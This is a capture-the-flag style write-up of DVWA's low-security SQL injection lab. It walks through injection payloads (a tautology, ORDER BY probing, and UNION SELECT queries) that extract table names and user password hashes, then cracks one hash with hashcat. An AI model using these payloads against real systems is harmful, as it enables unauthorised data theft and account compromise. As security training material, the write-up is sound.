# DVWA – SQL Injection (Low)

> This writeup follows the OWASP Web Security Testing Guide (WSTG) methodology.

---

## Goal

Extract database contents by exploiting a completely unsanitised SQL injection in the user ID text field.

---

## Lab

[http://localhost/dvwa/vulnerabilities/sqli/](http://localhost/dvwa/vulnerabilities/sqli/)

---

## OWASP Category

A03:2021 – Injection (SQL Injection) | WSTG-INPV-05

---

## Mitigation Level Notes

At **Low** security, user input is concatenated directly into the SQL query with no escaping, no prepared statements, and no filtering.

---

## Steps to Solve

**Step 1 — Set security to Low and test the field**

Enter `1` → returns "First name: admin, Surname: admin". The underlying query is:
```sql
SELECT first_name, last_name FROM users WHERE user_id = '$id';
```

<img width="1250" height="911" alt="image" src="https://github.com/user-attachments/assets/9ebf85af-b117-400b-971a-7efe8dfcbc7e" />

---

**Step 2 — Confirm injection**

```
1' OR '1'='1
```

Returns all users — injection confirmed.

<img width="1180" height="951" alt="image" src="https://github.com/user-attachments/assets/2c2b5b21-ff80-4cf7-a7c3-df50acbe6226" />

---

**Step 3 — Determine column count**

```
1' ORDER BY 1-- -    works
1' ORDER BY 2-- -    works
1' ORDER BY 3-- -    error
```

Two columns in the result set.

<img width="1337" height="186" alt="image" src="https://github.com/user-attachments/assets/756f71ab-698f-4134-8629-038ea1fcfc54" />

---

**Step 4 — Extract data with UNION SELECT**

```
' UNION SELECT user(), database()-- -
```

DB user and database name appear in the First/Surname fields.


<img width="1105" height="905" alt="image" src="https://github.com/user-attachments/assets/6f3f43f3-0935-42a0-9754-9276ed925526" />


```
' UNION SELECT table_name, NULL FROM information_schema.tables WHERE table_schema=database()-- -
```

Tables: `guestbook`, `users`.

<img width="1210" height="811" alt="image" src="https://github.com/user-attachments/assets/7398e924-45f9-478d-9f65-5b251abbe87c" />

```
' UNION select COLUMN_NAME,TABLE_NAME from INFORMATION_SCHEMA.COLUMNS where table_name='users'-- -
```

Columns in users table: user, password...

<img width="1359" height="747" alt="image" src="https://github.com/user-attachments/assets/60613c96-bfca-4cd9-b7ab-78d0fa258296" />


```
' UNION SELECT user, password FROM users-- -
```

All usernames and MD5 hashes.

<img width="1070" height="719" alt="image" src="https://github.com/user-attachments/assets/3657a138-fc73-4d7b-ab70-d2a2a110e379" />

---

**Step 5 — Crack the hashes**

```bash
hashcat -m 0 -a 0 e99a18c428cb38d5f260853678922e03 rockyou.txt
# gordonb:abc123
```

<img width="720" height="237" alt="image" src="https://github.com/user-attachments/assets/c3a9ddaf-3629-4247-bd8b-39b15233439a" />

---

**Lab Solved**

<img width="1153" height="191" alt="image" src="https://github.com/user-attachments/assets/1a4ff193-ca37-48a2-8ddf-1761b5c68c44" />

---

*This writeup is intended for educational purposes only. All techniques documented here were performed on DVWA, an intentionally vulnerable practice platform. The author does not encourage or condone the use of these methods against any system without explicit written permission. Unauthorized use of these techniques may violate applicable laws and regulations.*
